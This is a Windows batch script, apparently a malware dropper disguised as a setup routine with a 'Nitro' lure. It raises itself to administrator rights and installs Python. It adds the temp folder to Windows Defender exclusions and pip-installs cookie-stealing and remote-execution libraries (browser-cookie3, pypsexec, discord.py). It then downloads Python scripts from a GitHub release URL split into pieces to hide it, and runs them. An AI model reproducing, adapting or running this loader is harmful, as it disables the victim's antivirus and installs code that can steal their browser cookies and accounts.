::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJheFUBAlbMbQs=
::ZQ05rAF9IBncCkqN+0xwdVsFHErXcjn0V9U=
::ZQ05rAF9IAHYFVzEqQIeIQ9GQ2Q=
::eg0/rx1wNQPfEVWB+kM9LVsJDCqLKHm1RpIZ5u3p7v6IsC0=
::fBEirQZwNQPfEVWB+kM9LVsJDCqLKHm1IbASiA==
::cRolqwZ3JBvQF1fEqQIXLRVRXgWWOXj6KLwI+ueb
::dhA7uBVwLU+EWH2N50E/Oh80
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFCt3diusGSWdI4k45//14+WGpl4hdcsWUaby84CyE/QW60nhZ4UR+FNuquRCCQNdHg==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal EnableDelayedExpansion

:: Log file for debugging
set "logFile=%TEMP%\setup_log.txt"
echo [START] Script started at %date% %time% > "%logFile%"

:: Check if running as admin
net session >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [INFO] Requesting admin privileges... >> "%logFile%"
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Normal"
    exit /b
)

:: If already running with admin privileges, proceed
echo [INFO] Running with admin privileges... >> "%logFile%"

:: Define variables
set "dPath=%TEMP%"
set "mFile1=Requirements.py"
set "mFile2=NITRO.py"
set "tLoc1=%dPath%\%mFile1%"
set "tLoc2=%USERPROFILE%\Desktop\%mFile2%"  :: Set tLoc2 to the same directory as the batch file
set "uKey=CRYPT-%RANDOM%-%RANDOM%"
set "gSet=rbx;gtag;fn"
set "svcName=ModSvc_%RANDOM%"

set "s1=https://"
set "s2=github.com/"
set "s3=RootFungus/"
set "s4=FINA-PLAWF/releases/download/beta/"
set "s5=Requirements.py"
set "s6=NITRO.py"

:CHECK_PYTHON
echo [INFO] Checking if Python is installed... >> "%logFile%"
where python >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [INFO] Python not found in PATH. Trying direct check... >> "%logFile%"
    reg query HKCU\Software\Python\PythonCore\3.10\InstallPath >nul 2>&1
    if %ERRORLEVEL% NEQ 0 (
        echo [INFO] Python not detected. Proceeding with install. >> "%logFile%"
        goto :INSTALL_PYTHON
    ) else (
        echo [INFO] Found Python registry key. Adding to PATH temporarily... >> "%logFile%"
        set "PATH=%APPDATA%\Python\Python310;%APPDATA%\Python\Python310\Scripts;%PATH%"
        goto :INSTALL_DEPENDENCIES
    )
)

:: Check if pip works
python -c "import pip" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [WARNING] Python found but pip is missing. Reinstalling Python... >> "%logFile%"
    goto :INSTALL_PYTHON
)

echo [INFO] Python and pip are working. >> "%logFile%"
goto :INSTALL_DEPENDENCIES

:INSTALL_PYTHON
set "pyInstaller=python-3.10.10-amd64.exe"
set "pyUrl=https://www.python.org/ftp/python/3.10.10/%pyInstaller% "

echo [INFO] Downloading Python installer... >> "%logFile%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '!pyUrl!' -OutFile '%TEMP%\%pyInstaller%' -ErrorAction Stop" >> "%logFile%" 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Failed to download Python installer. Aborting. >> "%logFile%"
    exit /b 1
)

echo [INFO] Installing Python with pip... >> "%logFile%"
echo [INFO] Installing Python (this may take a moment)... >> "%logFile%"
start "" /wait "%TEMP%\%pyInstaller%" InstallAllUsers=1 PrependPath=1 TargetDir="C:\Python310" Include_pip=1
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Failed to install Python. Aborting.
    exit /b 1
)
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Failed to install Python. Aborting. >> "%logFile%"
    exit /b 1
)

echo [INFO] Updating PATH after install... >> "%logFile%"
set "PATH=C:\Python310;C:\Python310\Scripts;%PATH%"
goto :INSTALL_DEPENDENCIES

:: Install Dependencies
:INSTALL_DEPENDENCIES
echo [INFO] Installing required Python packages... >> "%logFile%"
echo [INFO] Installing required Python packages... >> "%logFile%"
"C:\Python310\python.exe" -m pip install --no-warn-script-location requests discord.py pycryptodome psutil pywin32 pypsexec browser-cookie3 gputil screeninfo
IF ERRORLEVEL 1 (
    echo [ERROR] Failed to install Python packages. Aborting.
    goto :CLEANUP
)
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Failed to install Python packages. Aborting. >> "%logFile%"
    exit /b 1
)
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Failed to install Python packages. Aborting. >> "%logFile%"
    goto :CLEANUP
)

echo [INFO] Required Python packages installed successfully. >> "%logFile%"

:: Add ONLY %TEMP% to Windows Defender exclusions
echo [INFO] Adding %TEMP% to Windows Defender exclusions... >> "%logFile%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -ExclusionPath \"$env:TEMP\" -ErrorAction SilentlyContinue" >> "%logFile%" 2>&1

:: Download Python.exe to %TEMP%
echo [INFO] Downloading %mFile1%... >> "%logFile%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri \"!s1!!s2!!s3!!s4!!s5!\" -OutFile \"%tLoc1%\" -ErrorAction Stop" >> "%logFile%" 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Failed to download %mFile1%. Aborting. >> "%logFile%"
    goto :CLEANUP
)

:: Download NITRO.py to Desktop
echo [INFO] Downloading %mFile2% to desktop... >> "%logFile%"
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
Invoke-WebRequest -Uri 'https://github.com/RootFungus/FINA-PLAWF/releases/download/beta/NITRO.py ' -OutFile '%tLoc2%' -ErrorAction Stop" >> "%logFile%" 2>&1

if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Failed to download %mFile2%. Aborting. >> "%logFile%"
    goto :CLEANUP
)

:: Run Python.exe (hidden)
echo [INFO] Running %mFile1%... >> "%logFile%"
python "%tLoc1%" >> "%logFile%" 2>&1
if %ERRORLEVEL% EQU 0 (
    echo [SUCCESS] %mFile1% executed. >> "%logFile%"
) else (
    echo [WARNING] There may be issues in execution. >> "%logFile%"
)

:: Launch NITRO.py in new CMD window
echo [INFO] Launching NITRO.py in new command window... >> "%logFile%"
start "" cmd /k "cd /d "%USERPROFILE%\Desktop" && python "%tLoc2%""
if %ERRORLEVEL% EQU 0 (
    echo [SUCCESS] NITRO.py launched in new window. >> "%logFile%"
) else (
    echo [ERROR] Failed to launch NITRO.py in new window. >> "%logFile%"
)

echo.
echo ===================================================
echo [SUCCESS] Process Complete
echo Press any key to exit...
echo ===================================================
pause >nul
exit /b